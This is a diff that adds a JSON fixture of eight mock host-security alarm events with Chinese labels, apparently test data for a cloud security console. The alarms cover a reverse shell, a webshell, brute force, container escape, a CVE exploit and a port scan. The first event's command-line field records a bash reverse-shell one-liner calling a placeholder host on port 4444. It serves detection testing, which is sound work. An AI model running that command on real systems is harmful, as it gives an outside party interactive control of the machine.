@@ -1,0 +1,424 @@
+[
+  {
+    "Id": 100000000001,
+    "Name": "反弹 Shell 进程",
+    "Desc": "主机上检测到 bash 反弹 Shell",
+    "Level": "serious",
+    "EventStatus": 1,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0001",
+    "InstanceName": "web-01",
+    "InternetIp": "10.0.0.111",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0001",
+    "AlarmEventType": "MaliciousProcess",
+    "AlarmEventTypeDisplay": "MaliciousProcess",
+    "AlarmEventName": "ReverseShell",
+    "AlarmEventNameDisplay": "ReverseShell",
+    "EventSubType": "MaliciousProcess",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "203.0.113.11",
+        "ValueDisplay": "203.0.113.11"
+      },
+      {
+        "NameDisplay": "命令行",
+        "Type": "cmdline",
+        "Value": "bash -i >& /dev/tcp/203.0.113.11/4444 0>&1",
+        "ValueDisplay": "bash -i >& /dev/tcp/203.0.113.11/4444 0>&1"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0001",
+    "Stages": "mock",
+    "Count": 1
+  },
+  {
+    "Id": 100000000002,
+    "Name": "Webshell 文件",
+    "Desc": "网站目录发现一句话木马",
+    "Level": "high",
+    "EventStatus": 1,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0002",
+    "InstanceName": "web-02",
+    "InternetIp": "10.0.0.112",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0002",
+    "AlarmEventType": "MaliciousFile",
+    "AlarmEventTypeDisplay": "MaliciousFile",
+    "AlarmEventName": "Webshell",
+    "AlarmEventNameDisplay": "Webshell",
+    "EventSubType": "MaliciousFile",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "198.51.100.21",
+        "ValueDisplay": "198.51.100.21"
+      },
+      {
+        "NameDisplay": "文件路径",
+        "Type": "file_path",
+        "Value": "/var/www/html/mock-shell.php",
+        "ValueDisplay": "/var/www/html/mock-shell.php"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0002",
+    "Stages": "mock",
+    "Count": 2
+  },
+  {
+    "Id": 100000000003,
+    "Name": "SSH 暴力破解",
+    "Desc": "大量 SSH 登录失败",
+    "Level": "suspicious",
+    "EventStatus": 2,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0003",
+    "InstanceName": "db-01",
+    "InternetIp": "10.0.0.113",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0003",
+    "AlarmEventType": "HostLogin",
+    "AlarmEventTypeDisplay": "HostLogin",
+    "AlarmEventName": "BruteForce",
+    "AlarmEventNameDisplay": "BruteForce",
+    "EventSubType": "HostLogin",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "203.0.113.31",
+        "ValueDisplay": "203.0.113.31"
+      },
+      {
+        "NameDisplay": "失败次数",
+        "Type": "count",
+        "Value": "87",
+        "ValueDisplay": "87"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0003",
+    "Stages": "mock",
+    "Count": 87
+  },
+  {
+    "Id": 100000000004,
+    "Name": "容器逃逸行为",
+    "Desc": "容器内检测到挂载宿主机目录",
+    "Level": "high",
+    "EventStatus": 1,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0004",
+    "InstanceName": "container-host-01",
+    "InternetIp": "10.0.0.114",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0004",
+    "AlarmEventType": "Container",
+    "AlarmEventTypeDisplay": "Container",
+    "AlarmEventName": "Escape",
+    "AlarmEventNameDisplay": "Escape",
+    "EventSubType": "Container",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "198.51.100.41",
+        "ValueDisplay": "198.51.100.41"
+      },
+      {
+        "NameDisplay": "容器ID",
+        "Type": "container_id",
+        "Value": "mock-container-0004",
+        "ValueDisplay": "mock-container-0004"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0004",
+    "Stages": "mock",
+    "Count": 1,
+    "ContainerId": "mock-container-0004",
+    "ContainerImageName": "registry.example.com/mock/app:1.0"
+  },
+  {
+    "Id": 100000000005,
+    "Name": "K8s 异常 Pod",
+    "Desc": "Pod 以特权模式运行",
+    "Level": "medium",
+    "EventStatus": 3,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0005",
+    "InstanceName": "k8s-node-01",
+    "InternetIp": "10.0.0.115",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0005",
+    "AlarmEventType": "Kubernetes",
+    "AlarmEventTypeDisplay": "Kubernetes",
+    "AlarmEventName": "PrivilegedPod",
+    "AlarmEventNameDisplay": "PrivilegedPod",
+    "EventSubType": "Kubernetes",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "192.0.2.51",
+        "ValueDisplay": "192.0.2.51"
+      },
+      {
+        "NameDisplay": "Pod",
+        "Type": "pod",
+        "Value": "mock-pod-0005",
+        "ValueDisplay": "mock-pod-0005"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0005",
+    "Stages": "mock",
+    "Count": 1,
+    "K8sClusterId": "mock-cluster",
+    "K8sClusterName": "mock-k8s",
+    "K8sNamespace": "default",
+    "K8sPodName": "mock-pod-0005"
+  },
+  {
+    "Id": 100000000006,
+    "Name": "应用漏洞利用",
+    "Desc": "检测到针对 CVE 的利用尝试",
+    "Level": "high",
+    "EventStatus": 1,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0006",
+    "InstanceName": "app-01",
+    "InternetIp": "10.0.0.116",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0006",
+    "AlarmEventType": "Vulnerability",
+    "AlarmEventTypeDisplay": "Vulnerability",
+    "AlarmEventName": "CVE",
+    "AlarmEventNameDisplay": "CVE",
+    "EventSubType": "Vulnerability",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "203.0.113.61",
+        "ValueDisplay": "203.0.113.61"
+      },
+      {
+        "NameDisplay": "CVE",
+        "Type": "cve",
+        "Value": "CVE-2026-0001",
+        "ValueDisplay": "CVE-2026-0001"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0006",
+    "Stages": "mock",
+    "Count": 4
+  },
+  {
+    "Id": 100000000007,
+    "Name": "基线弱口令",
+    "Desc": "系统账号使用弱口令",
+    "Level": "remind",
+    "EventStatus": 5,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0007",
+    "InstanceName": "bastion-01",
+    "InternetIp": "10.0.0.117",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0007",
+    "AlarmEventType": "Baseline",
+    "AlarmEventTypeDisplay": "Baseline",
+    "AlarmEventName": "WeakPassword",
+    "AlarmEventNameDisplay": "WeakPassword",
+    "EventSubType": "Baseline",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "192.0.2.71",
+        "ValueDisplay": "192.0.2.71"
+      },
+      {
+        "NameDisplay": "账号",
+        "Type": "user",
+        "Value": "mock-admin",
+        "ValueDisplay": "mock-admin"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0007",
+    "Stages": "mock",
+    "Count": 1
+  },
+  {
+    "Id": 100000000008,
+    "Name": "网络扫描",
+    "Desc": "源 IP 对常见端口发起扫描",
+    "Level": "low",
+    "EventStatus": 1,
+    "OccurrenceTime": "2026-01-01T00:00:00Z",
+    "LastTime": "2026-01-01T00:00:00Z",
+    "OccurrenceTimeStamp": 0,
+    "LastTimeStamp": 0,
+    "OperateTime": 0,
+    "InstanceId": "i-mock0008",
+    "InstanceName": "edge-01",
+    "InternetIp": "10.0.0.118",
+    "IntranetIp": "10.0.0.100",
+    "Uuid": "mock-uuid-0008",
+    "AlarmEventType": "Network",
+    "AlarmEventTypeDisplay": "Network",
+    "AlarmEventName": "PortScan",
+    "AlarmEventNameDisplay": "PortScan",
+    "EventSubType": "Network",
+    "DataSource": "agent",
+    "SaleVersion": "mock",
+    "CanBeDealOnLine": true,
+    "MarkList": [
+      "mock"
+    ],
+    "Details": [
+      {
+        "NameDisplay": "源IP",
+        "Type": "source_ip",
+        "Value": "198.51.100.81",
+        "ValueDisplay": "198.51.100.81"
+      },
+      {
+        "NameDisplay": "端口",
+        "Type": "port",
+        "Value": "22,80,443",
+        "ValueDisplay": "22,80,443"
+      }
+    ],
+    "TacticItems": [
+      {
+        "TacticId": "TA0001",
+        "TacticDisplayName": "Initial Access"
+      }
+    ],
+    "SourceAliUid": 100000000001,
+    "SecurityEventIds": "mock-security-event-0008",
+    "Stages": "mock",
+    "Count": 24
+  }
+]
